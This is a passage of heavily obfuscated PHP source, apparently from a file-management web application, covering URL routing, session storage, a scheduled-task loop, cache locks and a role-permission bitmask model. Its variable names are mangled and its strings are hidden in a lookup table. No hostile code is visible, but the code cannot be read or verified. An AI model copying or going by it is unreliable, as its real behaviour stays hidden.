(empty($¢ÁıßÎÓ)) { return; } $é»çëåÉ = array_to_keyvalue($¢ÁıßÎÓ, $£ëÍ–¦[12], $£ëÍ–¦[636]); Model($£ëÍ–¦[635])->remove($é»çëåÉ); } } goto Cí­ŞÄö§¬; CöŠ»Ûáé: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\133\136\57\x5d\53", "\x3a\156\165\155" => "\133\x30\x2d\x39\135\x2b", "\72\141\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($ÂÉ®²˜Ç, $¤Àæø§¢) { $Ô„ŸóÅƒ =& $_SERVER[Î‹ÃÂŞ„]; if ($ÂÉ®²˜Ç == $Ô„ŸóÅƒ[1646]) { $Åø–ŠÙ£ = array_map($Ô„ŸóÅƒ[1647], $¤Àæø§¢[0]); $ÏÏƒ®‘ò = strpos($¤Àæø§¢[1], $Ô„ŸóÅƒ[8]) === 0 ? $¤Àæø§¢[1] : $Ô„ŸóÅƒ[8] . $¤Àæø§¢[1]; $”¥Íİ§É = $¤Àæø§¢[2]; } else { $Åø–ŠÙ£ = null; $ÏÏƒ®‘ò = strpos($¤Àæø§¢[0], $Ô„ŸóÅƒ[8]) === 0 ? $¤Àæø§¢[0] : $Ô„ŸóÅƒ[8] . $¤Àæø§¢[0]; $”¥Íİ§É = $¤Àæø§¢[1]; } array_push(self::$maps, $Åø–ŠÙ£); array_push(self::$routes, $ÏÏƒ®‘ò); array_push(self::$methods, strtoupper($ÂÉ®²˜Ç)); array_push(self::$callbacks, $”¥Íİ§É); } public static function error($ÌùîƒâÈ) { self::$errorCallback = $ÌùîƒâÈ; } public static function haltOnMatch($ğá±…«– = true) { self::$halts = $ğá±…«–; } public static function dispatch() { $Ç¿›°âê =& $_SERVER[Î‹ÃÂŞ„]; $¤¯¯ß‹ = parse_url($_SERVER[$Ç¿›°âê[1648]], PHP_URL_PATH); $İÅçáÊ = $_SERVER[$Ç¿›°âê[162]]; $ü÷¶µÜ¬ = array_keys(static::$patterns); $Ì™®‡½Š = array_values(static::$patterns); $­¶Ñğï¡ = !1; self::$routes = preg_replace($Ç¿›°âê[1331], $Ç¿›°âê[8], self::$routes); if (in_array($¤¯¯ß‹, self::$routes)) { $Ö´úŒá± = array_keys(self::$routes, $¤¯¯ß‹); foreach ($Ö´úŒá± as $í·ÌÙÁî) { if (self::$methods[$í·ÌÙÁî] == $İÅçáÊ || self::$methods[$í·ÌÙÁî] == $Ç¿›°âê[1649] || in_array($İÅçáÊ, self::$maps[$í·ÌÙÁî])) { $­¶Ñğï¡ = !0; if (!is_object(self::$callbacks[$í·ÌÙÁî])) { $Åö»ÏÆ = explode($Ç¿›°âê[8], self::$callbacks[$í·ÌÙÁî]); $ï«™°ê = end($Åö»ÏÆ); $®šêéÇô = explode($Ç¿›°âê[1263], $ï«™°ê); $ËíûÕîµ = new $®šêéÇô[0](); $ËíûÕîµ->{$®šêéÇô[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$í·ÌÙÁî]); if (self::$halts) { return; } } } } } else { $ƒÚùæ Á = 0; foreach (self::$routes as $í·ÌÙÁî) { if (strpos($í·ÌÙÁî, $Ç¿›°âê[4]) !== !1) { $í·ÌÙÁî = str_replace($ü÷¶µÜ¬, $Ì™®‡½Š, $í·ÌÙÁî); } if (preg_match($Ç¿›°âê[1650] . $í·ÌÙÁî . $Ç¿›°âê[1651], $¤¯¯ß‹, $’Ë¯ŒŸŞ)) { if (self::$methods[$ƒÚùæ Á] == $İÅçáÊ || self::$methods[$ƒÚùæ Á] == $Ç¿›°âê[1649] || !empty(self::$maps[$ƒÚùæ Á]) && in_array($İÅçáÊ, self::$maps[$ƒÚùæ Á])) { $­¶Ñğï¡ = !0; array_shift($’Ë¯ŒŸŞ); if (!is_object(self::$callbacks[$ƒÚùæ Á])) { $Åö»ÏÆ = explode($Ç¿›°âê[8], self::$callbacks[$ƒÚùæ Á]); $ï«™°ê = end($Åö»ÏÆ); $®šêéÇô = explode($Ç¿›°âê[1263], $ï«™°ê); $ËíûÕîµ = new $®šêéÇô[0](); if (!method_exists($ËíûÕîµ, $®šêéÇô[1])) { echo $Ç¿›°âê[1652]; } else { call_user_func_array(array($ËíûÕîµ, $®šêéÇô[1]), $’Ë¯ŒŸŞ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ƒÚùæ Á], $’Ë¯ŒŸŞ); if (self::$halts) { return; } } } } $ƒÚùæ Á++; } } if ($­¶Ñğï¡ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $áİŸöñã =& $_SERVER[Î‹ÃÂŞ„]; header($_SERVER[$áİŸöñã[1653]] . $áİŸöñã[1654]); echo $áİŸöñã[1655]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ç¿›°âê[1648]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ó©ÂÁ‚ =& $_SERVER[Î‹ÃÂŞ„]; static $áš‹Ô·× = false; if ($áš‹Ô·×) { return $áš‹Ô·×; } $øÛÜƒ«™ = $GLOBALS[$ó©ÂÁ‚[6]][$ó©ÂÁ‚[395]]; self::$sessionTime = $øÛÜƒ«™[$ó©ÂÁ‚[1656]]; $ö¬îµ™‡ = isset($GLOBALS[$ó©ÂÁ‚[1657]]) ? $GLOBALS[$ó©ÂÁ‚[1657]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ö¬îµ™‡)) { self::$sessionSign = Cookie::get($ö¬îµ™‡); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ö¬îµ™‡, self::$sessionSign, self::$sessionTime); $Ğ©†ªø = $øÛÜƒ«™[$ó©ÂÁ‚[1658]]; $È÷Å›¤ = $øÛÜƒ«™[$Ğ©†ªø]; $™îÌı½æ = $øÛÜƒ«™[$ó©ÂÁ‚[875]]; switch ($Ğ©†ªø) { case $ó©ÂÁ‚[21]: self::$handle = Model($ó©ÂÁ‚[876]); break; case $ó©ÂÁ‚[877]: self::$handle = new CacheRedis($È÷Å›¤, $™îÌı½æ); break; case $ó©ÂÁ‚[878]: self::$handle = new CacheMemcached($È÷Å›¤, $™îÌı½æ); break; case $ó©ÂÁ‚[216]: $È÷Å›¤[$ó©ÂÁ‚[86]] = $È÷Å›¤[$ó©ÂÁ‚[86]] . $ó©ÂÁ‚[1659]; self::$handle = new CacheFile($È÷Å›¤, $™îÌı½æ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $áš‹Ô·× = new self(); return $áš‹Ô·×; } public static function getBySign($óÒ´ı›¾) { $“ÜÇüÌ = self::$handle->get($óÒ´ı›¾); $“ÜÇüÌ = unserialize($“ÜÇüÌ); return is_array($“ÜÇüÌ) ? $“ÜÇüÌ : array(); } public static function setBySign($˜òóúµÛ, $¤Ê»—äÇ) { CacheLock::lock($˜òóúµÛ); self::$handle->set($˜òóúµÛ, serialize($¤Ê»—äÇ), self::$sessionTime); CacheLock::unlock($˜òóúµÛ); } public static function sign($ºŠ’Ğµà = false) { if ($ºŠ’Ğµà) { self::$sessionSign = $ºŠ’Ğµà; } self::init(); return self::$sessionSign; } public static function set($–ÛäÔğ¾, $›è¹©å¿ = false) { self::init(); if (is_array($–ÛäÔğ¾)) { foreach ($–ÛäÔğ¾ as $ÔÎĞùã¶ => $´Õèú©ä) { array_set_value(self::$data, $ÔÎĞùã¶, $´Õèú©ä); } } else { array_set_value(self::$data, $–ÛäÔğ¾, $›è¹©å¿); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Á Û‹©¤ = false) { self::init(); if (!$Á Û‹©¤) { return self::$data; } return array_get_value(self::$data, $Á Û‹©¤); } public static function remove($Ï¸ä“İŒ) { self::init(); unset(self::$data[$Ï¸ä“İŒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Î‹ÃÂŞ„][881])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $½ı¹‡‚ã =& $_SERVER[Î‹ÃÂŞ„]; if (self::valueGet($½ı¹‡‚ã[797]) != $½ı¹‡‚ã[90]) { return; } if (self::valueGet($½ı¹‡‚ã[1660]) == $½ı¹‡‚ã[90]) { $÷¶ŒĞ¼ã = self::valueGet($½ı¹‡‚ã[1661]); if (time() - $÷¶ŒĞ¼ã > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($½ı¹‡‚ã[1660], $½ı¹‡‚ã[90]); self::log($½ı¹‡‚ã[1662] . ACTION . $½ı¹‡‚ã[1663]); Hook::bind($½ı¹‡‚ã[1664], $½ı¹‡‚ã[1665]); $Ü‘²ƒù¦ = 0; while (!0) { self::cacheClear(); if (self::valueGet($½ı¹‡‚ã[797]) != $½ı¹‡‚ã[90]) { self::valueSet($½ı¹‡‚ã[1660], $½ı¹‡‚ã[214]); self::log($½ı¹‡‚ã[1666]); die; } $ñ±¹õÔ = time(); if ($ñ±¹õÔ - $Ü‘²ƒù¦ >= 60) { self::valueSet(array($½ı¹‡‚ã[1660] => $½ı¹‡‚ã[90], $½ı¹‡‚ã[1661] => $ñ±¹õÔ), !1); $Ü‘²ƒù¦ = $ñ±¹õÔ; } if (!file_exists(USER_SYSTEM . $½ı¹‡‚ã[1667])) { self::valueSet(array($½ı¹‡‚ã[1660] => $½ı¹‡‚ã[214], $½ı¹‡‚ã[797] => $½ı¹‡‚ã[214]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ ‹íêßì =& $_SERVER[Î‹ÃÂŞ„]; http_close(); $GLOBALS[$ ‹íêßì[1668]] = 1; $_SERVER[$ ‹íêßì[1669]] = $ ‹íêßì[1670]; $_COOKIE = array(); $GLOBALS[$ ‹íêßì[539]] = 1; $GLOBALS[$ ‹íêßì[1671]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $üşÔ€®† =& $_SERVER[Î‹ÃÂŞ„]; http_close(); self::valueSet($üşÔ€®†[797], $üşÔ€®†[214]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($üşÔ€®†[1660] => $üşÔ€®†[214], $üşÔ€®†[797] => $üşÔ€®†[90]), !1); } public static function taskSwitch() { $£ƒÆùğ =& $_SERVER[Î‹ÃÂŞ„]; $®ÔÇî»í = self::valueGet($£ƒÆùğ[797]) == $£ƒÆùğ[90] ? $£ƒÆùğ[214] : $£ƒÆùğ[90]; self::valueSet($£ƒÆùğ[797], $®ÔÇî»í); } public static function shutdownEvent() { $ü—’Ôö =& $_SERVER[Î‹ÃÂŞ„]; self::valueSet($ü—’Ôö[1660], $ü—’Ôö[214]); self::log($ü—’Ôö[1672]); } public static function config($óÓ‡Ü, $õŞ’Å˜) { self::valueSet($_SERVER[Î‹ÃÂŞ„][797], $óÓ‡Ü); } private static function taskRunAll() { $•ÜÙÀí =& $_SERVER[Î‹ÃÂŞ„]; $¼Æ÷ñ¶ = timeFloat(); $ÇÒĞßã = Model($•ÜÙÀí[1673])->listData(); $ˆ½®Â¯§ = count($ÇÒĞßã); for ($‡Ô¨Âˆ = 0; $‡Ô¨Âˆ < $ˆ½®Â¯§; $‡Ô¨Âˆ++) { $–é×Œú = $ÇÒĞßã[$‡Ô¨Âˆ]; if (!$–é×Œú[$•ÜÙÀí[445]] || $–é×Œú[$•ÜÙÀí[1674]] != $•ÜÙÀí[90]) { continue; } if (!self::taskTimeCheck($–é×Œú)) { continue; } self::taskRun($–é×Œú); } Hook::trigger($•ÜÙÀí[1675]); self::taskQueueRun($¼Æ÷ñ¶); } private static function taskQueueRun($¾ĞØøÙÇ) { $ëç€¾ë = 10; while (!0) { $ùöØñê = TaskQueue::run(); if ($ùöØñê === !1) { break; } if (timeFloat() - $¾ĞØøÙÇ >= $ëç€¾ë) { break; } } } private static function taskTimeCheck($Š—Öê²ı) { $…ƒÈšş— =& $_SERVER[Î‹ÃÂŞ„]; $»–¡”÷› = json_decode($Š—Öê²ı[$…ƒÈšş—[196]], !0); $Ùá‰Ä¶Œ = intval($Š—Öê²ı[$…ƒÈšş—[1661]]); $±øºøŠé = strtotime($…ƒÈšş—[1676] . $»–¡”÷›[$…ƒÈšş—[1677]] . $…ƒÈšş—[1678]) - strtotime($…ƒÈšş—[1679]); $³²½í¨× = time() - strtotime(date($…ƒÈšş—[1680]) . $…ƒÈšş—[1681]); $«Ä ÛÆ† = $³²½í¨× >= $±øºøŠé && $³²½í¨× <= $±øºøŠé + 3600; switch ($»–¡”÷›[$…ƒÈšş—[33]]) { case $…ƒÈšş—[1682]: if (time() - $Ùá‰Ä¶Œ < 3600 * 24 * 30) { return !1; } if ($»–¡”÷›[$…ƒÈšş—[1682]] == date($…ƒÈšş—[1683]) && $«Ä ÛÆ†) { return !0; } break; case $…ƒÈšş—[1684]: if (time() - $Ùá‰Ä¶Œ < 3600 * 24 * 7) { return !1; } $€¦°Ï›“ = date($…ƒÈšş—[1685]) == 0 ? 7 : date($…ƒÈšş—[1685]); if ($»–¡”÷›[$…ƒÈšş—[1684]] == $€¦°Ï›“ && $«Ä ÛÆ†) { return !0; } break; case $…ƒÈšş—[1677]: if (time() - $Ùá‰Ä¶Œ < 3600 * 24) { return !1; } if ($«Ä ÛÆ†) { return !0; } break; case $…ƒÈšş—[1686]: if (time() - $Ùá‰Ä¶Œ >= floatval($»–¡”÷›[$…ƒÈšş—[1686]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $°µ±€  =& $_SERVER[Î‹ÃÂŞ„]; static $°È¶Ğ§ = 0; $Òà¤Ö’ = 300; if (!$°È¶Ğ§) { $°È¶Ğ§ = time(); } if (time() - $°È¶Ğ§ < $Òà¤Ö’) { return; } $°È¶Ğ§ = time(); $üÉìÇûä = Model($°µ±€ [549])->db($°µ±€ [12]); if ($üÉìÇûä) { $üÉìÇûä->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($°µ±€ [1687], $°µ±€ [1688]); die; } } public static function taskRun($ …²ºÅ‹) { $¾€õ‰¸ =& $_SERVER[Î‹ÃÂŞ„]; self::log($¾€õ‰¸[1689] . $ …²ºÅ‹[$¾€õ‰¸[445]] . $¾€õ‰¸[1690] . $ …²ºÅ‹[$¾€õ‰¸[32]] . $¾€õ‰¸[1691] . $ …²ºÅ‹[$¾€õ‰¸[1692]]); Model($¾€õ‰¸[1673])->run($ …²ºÅ‹[$¾€õ‰¸[445]]); $€€ª‡üÂ = timeFloat(); $¡âİòĞŒ = $¾€õ‰¸[12]; switch ($ …²ºÅ‹[$¾€õ‰¸[33]]) { case $¾€õ‰¸[353]: $¦ü®Ä¡½ = url_request($ …²ºÅ‹[$¾€õ‰¸[1692]], $¾€õ‰¸[247], !1, !1, !1, !1, 10); if ($¦ü®Ä¡½[$¾€õ‰¸[797]]) { $¡âİòĞŒ = strlen($¦ü®Ä¡½[$¾€õ‰¸[1257]]); } break; case $¾€õ‰¸[246]: $¡âİòĞŒ = Hook::apply($ …²ºÅ‹[$¾€õ‰¸[1692]]); default: break; } Model($¾€õ‰¸[1693])->add(array($¾€õ‰¸[1694] => $¾€õ‰¸[12], $¾€õ‰¸[1695] => $¾€õ‰¸[214], $¾€õ‰¸[33] => $¾€õ‰¸[1696] . $ …²ºÅ‹[$¾€õ‰¸[445]], $¾€õ‰¸[1697] => json_encode(array($¾€õ‰¸[32] => $ …²ºÅ‹[$¾€õ‰¸[32]], $¾€õ‰¸[1698] => timeFloat() - $€€ª‡üÂ, $¾€õ‰¸[339] => $¡âİòĞŒ)))); $®ô²œî¼ = $¡âİòĞŒ ? $¾€õ‰¸[1699] . $¡âİòĞŒ : $¾€õ‰¸[12]; self::log($¾€õ‰¸[1700] . $ …²ºÅ‹[$¾€õ‰¸[445]] . $¾€õ‰¸[167] . $®ô²œî¼); return !0; } public static function valueGet($‚ûâèà½) { $”Ìî…Œä =& $_SERVER[Î‹ÃÂŞ„]; $®¿¯ËŞ = $”Ìî…Œä[1701]; $µ²êœ† = Model($”Ìî…Œä[478])->get($‚ûâèà½, $®¿¯ËŞ); if (is_null($µ²êœ†)) { Model($”Ìî…Œä[478])->set($”Ìî…Œä[797], $”Ìî…Œä[90], $®¿¯ËŞ); Model($”Ìî…Œä[478])->set($”Ìî…Œä[1660], $”Ìî…Œä[214], $®¿¯ËŞ); $µ²êœ† = Model($”Ìî…Œä[478])->get($‚ûâèà½, $®¿¯ËŞ); } return $µ²êœ†; } private static function valueSet($šş¢ñè´, $¼°àå ) { $ìÏÑÏÌ =& $_SERVER[Î‹ÃÂŞ„]; $œÂÆ©ªº = $ìÏÑÏÌ[1702]; CacheLock::lock($œÂÆ©ªº); $ÓŞâÖÌ§ = Model($ìÏÑÏÌ[478])->set($šş¢ñè´, $¼°àå , $ìÏÑÏÌ[1701]); CacheLock::unlock($œÂÆ©ªº); return $ÓŞâÖÌ§; } protected static function log($éˆú÷•ö) { write_log($éˆú÷•ö, $_SERVER[Î‹ÃÂŞ„][1688]); } private static function cacheClear() { $œñ€Ø¹ =& $_SERVER[Î‹ÃÂŞ„]; Cache::clearMemory(Model($œñ€Ø¹[478])->cacheKey($œñ€Ø¹[1701])); Cache::clearMemory(Model($œñ€Ø¹[478])->cacheKey($œñ€Ø¹[1703])); Model($œñ€Ø¹[1673])->cacheClear(); self::closeDatabase(); } } goto D¾¯ìøê²â; FÒÂ’¬«†: class CacheLockRedis { public function lock($ÑÂÕ£Ğø, $…Ë„¾À‘ = 10) { $†ªù¿ñ = Cache::init(); $»Ï™ú»€ = microtime(!0) + $…Ë„¾À‘; while (microtime(!0) < $»Ï™ú»€) { $ÈóÑªŠá = $†ªù¿ñ->get($ÑÂÕ£Ğø); if (!$ÈóÑªŠá) { $¯Û±¯µ = $†ªù¿ñ->setLock($ÑÂÕ£Ğø, $»Ï™ú»€, $…Ë„¾À‘); if ($¯Û±¯µ) { return !0; } } else { if ($ÈóÑªŠá < microtime(!0)) { $†ªù¿ñ->set($ÑÂÕ£Ğø, $»Ï™ú»€, $…Ë„¾À‘ * 2); if ($†ªù¿ñ->get($ÑÂÕ£Ğø) === $ÈóÑªŠá) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ø‹îõáô) { return Cache::init()->get($ø‹îõáô); } public function unlock($×¹†Ñ­) { return Cache::init()->remove($×¹†Ñ­); } } class CacheLockMemcached { public function lock($öœ­´¬æ, $å„©áğ‹ = 0) { $×ûşœ§Ù = Cache::init(); $—Ç’¿°š = microtime(!0) + $å„©áğ‹; while (microtime(!0) < $—Ç’¿°š) { $İ‰ñ´® = $×ûşœ§Ù->get($öœ­´¬æ); if (!$İ‰ñ´® || $İ‰ñ´® < microtime(!0)) { $î¦úÏàî = $×ûşœ§Ù->handle->add($öœ­´¬æ, $—Ç’¿°š, $å„©áğ‹); if ($î¦úÏàî) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¦æñÁËù) { return Cache::init()->get($¦æñÁËù); } public function unlock($úƒ¡€Òé) { return Cache::init()->remove($úƒ¡€Òé); } } class CacheLockDatabase { public function lock($ºä”ÄÈî, $¼¦¹¨º = 0) { $š»¦ÉıÔ = Model($_SERVER[Î‹ÃÂŞ„][876]); $¦€áÙƒ = microtime(!0) + $¼¦¹¨º; while (microtime(!0) < $¦€áÙƒ) { $¾»ß†î = $š»¦ÉıÔ->get($ºä”ÄÈî); if (!$¾»ß†î || $¾»ß†î < microtime(!0)) { $¶àş†´Í = $š»¦ÉıÔ->set($ºä”ÄÈî, $¦€áÙƒ); if ($¶àş†´Í) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Îõ÷ßç„) { return Model($_SERVER[Î‹ÃÂŞ„][876])->get($Îõ÷ßç„); } public function unlock($‚úÀÄÏò) { Model($_SERVER[Î‹ÃÂŞ„][876])->remove($‚úÀÄÏò); } } goto D¥ñé™â£Ÿ; D‚›’©ÖÔ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $µÔ€È œ =& $_SERVER[Î‹ÃÂŞ„]; $¢Ã˜ª®ô = array(array($µÔ€È œ[464] => LNG($µÔ€È œ[1903]), $µÔ€È œ[1904] => $µÔ€È œ[1905], $µÔ€È œ[1906] => 1, $µÔ€È œ[1907] => 1, $µÔ€È œ[1908] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($µÔ€È œ[464] => LNG($µÔ€È œ[1909]), $µÔ€È œ[1904] => $µÔ€È œ[1910], $µÔ€È œ[1906] => 2, $µÔ€È œ[1907] => 1, $µÔ€È œ[1908] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($µÔ€È œ[464] => LNG($µÔ€È œ[1911]), $µÔ€È œ[1904] => $µÔ€È œ[1912], $µÔ€È œ[1906] => 3, $µÔ€È œ[1907] => 1, $µÔ€È œ[1908] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($µÔ€È œ[464] => LNG($µÔ€È œ[1913]), $µÔ€È œ[1904] => $µÔ€È œ[1914], $µÔ€È œ[1906] => 4, $µÔ€È œ[1907] => 1, $µÔ€È œ[1908] => self::AUTH_SHOW | self::AUTH_VIEW), array($µÔ€È œ[464] => LNG($µÔ€È œ[1915]), $µÔ€È œ[1904] => $µÔ€È œ[1916], $µÔ€È œ[1906] => 5, $µÔ€È œ[1907] => 1, $µÔ€È œ[1908] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($µÔ€È œ[464] => LNG($µÔ€È œ[1917]), $µÔ€È œ[1904] => $µÔ€È œ[1918], $µÔ€È œ[1906] => 6, $µÔ€È œ[1907] => 1, $µÔ€È œ[1908] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($µÔ€È œ[464] => LNG($µÔ€È œ[1919]), $µÔ€È œ[1904] => $µÔ€È œ[1920], $µÔ€È œ[1906] => 7, $µÔ€È œ[1907] => 1, $µÔ€È œ[1908] => 0)); return $¢Ã˜ª®ô; } public static function authCheck($–è—æ, $½¥ÀßÔ) { $½ˆäÏóŸ =& $_SERVER[Î‹ÃÂŞ„]; $–è—æ = intval($–è—æ); if ($GLOBALS[$½ˆäÏóŸ[539]] && $GLOBALS[$½ˆäÏóŸ[6]][$½ˆäÏóŸ[1921]]) { return !0; } if ($–è—æ <= 0) { return !1; } if (($–è—æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($–è—æ & $½¥ÀßÔ); } public static function authCheckShow($µŠÅÔœ) { return self::authCheck($µŠÅÔœ, self::AUTH_SHOW); } public static function authCheckView($ÛŞĞ™ó) { return self::authCheck($ÛŞĞ™ó, self::AUTH_VIEW); } public static function authCheckDownload($²‘¼÷¨) { return self::authCheck($²‘¼÷¨, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ÿ›å·ù) { return self::authCheck($Ÿ›å·ù, self::AUTH_UPLOAD); } public static function authCheckEdit($‰½§Ù–Å) { return self::authCheck($‰½§Ù–Å, self::AUTH_EDIT); } public static function authCheckRemove($äå³²Éá) { return self::authCheck($äå³²Éá, self::AUTH_REMOVE); } public static function authCheckShare($ìş í˜Ø) { return self::authCheck($ìş í˜Ø, self::AUTH_SHARE); } public static function authCheckComment($ˆš’ºÙÆ) { return self::authCheck($ˆš’ºÙÆ, self::AUTH_COMMENT); } public static function authCheckEvent($µ–ä¨¥) { return self::authCheck($µ–ä¨¥, self::AUTH_EVENT); } public static function authCheckRoot($ûè®Ä˜) { return self::authCheck($ûè®Ä˜, self::AUTH_ROOT); } public static function authCheckAction($ä–™®š—, $ù¨¼Ÿ€¯) { $¼À‚²à› =& $_SERVER[Î‹ÃÂŞ„]; $ğÇ¾Ä½£ = array($¼À‚²à›[1922] => self::AUTH_VIEW, $¼À‚²à›[1249] => self::AUTH_DOWNLOAD, $¼À‚²à›[109] => self::AUTH_UPLOAD, $¼À‚²à›[1872] => self::AUTH_EDIT, $¼À‚²à›[1871] => self::AUTH_REMOVE, $¼À‚²à›[1882] => self::AUTH_SHARE, $¼À‚²à›[400] => self::AUTH_COMMENT, $¼À‚²à›[1692] => self::AUTH_EVENT, $¼À‚²à›[1923] => self::AUTH_ROOT); if (!isset($ğÇ¾Ä½£[$ù¨¼Ÿ€¯])) { return; } $‘Ã®ÜÅ = $ğÇ¾Ä½£[$ù¨¼Ÿ€¯]; $ä–™®š— = intval($ä–™®š—); if ($ä–™®š— <= 0) { return !1; } if (($ä–™®š— & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ä–™®š— & $‘Ã®ÜÅ); } public static function authDisable($¦§û‚¼¾, $şäˆ³) { if (intval($¦§û‚¼¾) <= 0) { return 0; } return intval($¦§û‚¼¾) & ~$şäˆ³; } public $optionType = "\123\x79\163\164\145\155\56\163\x6f\x75\162\143\x65\x41\x75\164\150\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\141\165\164\x68", "\154\x61\x62\145\154", "\x64\x69\x73\160\154\141\x79", "\x73\171\x73\x74\x65\x6d", "\163\157\x72\164"); public function initData() { $Ñä¬ĞÂ§ = $this->authDefault(); foreach ($Ñä¬ĞÂ§ as $ ä„õÓ€) { $this->add($ ä„õÓ€); } } public function findAuth($ÑÙØèÑ, $İ»š¯²à) { $Œõä—Éô =& $_SERVER[Î‹ÃÂŞ„]; $¢À²¾û  = parent::listData(); foreach ($¢À²¾û  as $“°²Óòğ) { $Û²¥ãŒ = intval($“°²Óòğ[$Œõä—Éô[457]]); if ($Û²¥ãŒ <= 0 || $“°²Óòğ[$Œõä—Éô[1924]] == 0) { continue; } if (($Û²¥ãŒ & $ÑÙØèÑ) != $ÑÙØèÑ) { continue; } if (($Û²¥ãŒ & $İ»š¯²à) != 0) { continue; } return $“°²Óòğ[$Œõä—Éô[445]]; } return !1; } public function findAuthReadOnly() { $´ÃÇ›ÂÜ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $²¥ÅòÛ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($´ÃÇ›ÂÜ, $²¥ÅòÛ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Â—ŸÉö =& $_SERVER[Î‹ÃÂŞ„]; $õÊ´Æ = parent::listData(); $„°¡¦µ‹ = !1; foreach ($õÊ´Æ as $ûı°¸) { if ($ûı°¸[$Â—ŸÉö[457]] <= 0 || $ûı°¸[$Â—ŸÉö[1924]] == $Â—ŸÉö[214]) { continue; } if (!$„°¡¦µ‹) { $„°¡¦µ‹ = $ûı°¸; continue; } if ($„°¡¦µ‹[$Â—ŸÉö[457]] > $ûı°¸[$Â—ŸÉö[457]]) { $„°¡¦µ‹ = $ûı°¸; } } return $„°¡¦µ‹ ? $„°¡¦µ‹[$Â—ŸÉö[445]] : $Â—ŸÉö[12]; } public function listData($â²…È¶¦ = false, $êß’í–¢ = "\x73\157\162\x74", $³¢¶„‘¾ = false) { return parent::listData($â²…È¶¦, $êß’í–¢, $³¢¶„‘¾); } public function update($òœá¾, $ÏåÉÆ) { $Øè…ïà® =& $_SERVER[Î‹ÃÂŞ„]; $é‰¿·¡º = parent::listData($òœá¾); $…·Ô‡Àº = $this->findByName($ÏåÉÆ[$Øè…ïà®[32]]); if (!$é‰¿·¡º || $…·Ô‡Àº && $…·Ô‡Àº[$Øè…ïà®[445]] != $é‰¿·¡º[$Øè…ïà®[445]]) { return !1; } $this->filterAuth($ÏåÉÆ[$Øè…ïà®[457]]); return parent::update($òœá¾, $ÏåÉÆ); } public function remove($í®ŸÎï) { $ú±şÖºØ = parent::listData($í®ŸÎï); if (!$ú±şÖºØ || $ú±şÖºØ[$_SERVER[Î‹ÃÂŞ„][181]]) { return !1; } return parent::remove($í®ŸÎï); } public function add($†Öğö÷¾ = array()) { $Š´º”óÚ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->findByName($†Öğö÷¾[$Š´º”óÚ[32]])) { return !1; } $‡©ƒ»‡¼ = array($Š´º”óÚ[32] => $Š´º”óÚ[12], $Š´º”óÚ[457] => 1, $Š´º”óÚ[1925] => $Š´º”óÚ[1912], $Š´º”óÚ[1924] => 1, $Š´º”óÚ[181] => 0, $Š´º”óÚ[1926] => 0); 